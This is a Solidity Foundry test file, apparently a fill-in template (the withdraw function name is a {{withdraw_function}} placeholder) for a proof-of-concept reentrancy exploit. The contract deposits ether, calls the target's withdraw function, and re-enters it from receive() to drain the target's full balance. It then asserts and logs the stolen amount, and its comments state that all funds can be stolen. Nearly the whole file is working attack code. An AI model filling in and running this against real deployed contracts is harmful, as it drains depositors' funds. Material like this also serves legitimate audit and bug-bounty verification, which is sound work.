// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITarget {
    function {{withdraw_function}}(uint256 amount) external;
    function deposit() external payable;
    function balances(address) external view returns (uint256);
}

contract ReentrancyPoC is Test {
    ITarget target;
    uint256 attackAmount = 1 ether;
    uint256 reentryCount;

    constructor(address _target) { target = ITarget(_target); }

    /// @notice Exploit reentrancy in {{withdraw_function}}
    /// @dev The target updates state AFTER the external call,
    ///      allowing our receive() to re-enter and drain funds.
    /// @impact All funds in the contract can be stolen.
    function attack() external {
        // Step 1: Deposit to establish a balance
        target.deposit{value: attackAmount}();
        uint256 initialTargetBalance = address(target).balance;

        // Step 2: Trigger withdraw — our receive() will re-enter
        target.{{withdraw_function}}(attackAmount);

        // Step 3: Verify exploit success
        assertGt(address(this).balance, attackAmount, "PoC failed: no extra funds drained");
        assertLt(address(target).balance, initialTargetBalance, "PoC failed: target balance unchanged");

        emit log_named_uint("Reentry count", reentryCount);
        emit log_named_uint("Funds drained", address(this).balance);
    }

    receive() external payable {
        reentryCount++;
        uint256 targetBal = address(target).balance;
        if (targetBal > 0) {
            target.{{withdraw_function}}(targetBal);
        }
    }
}
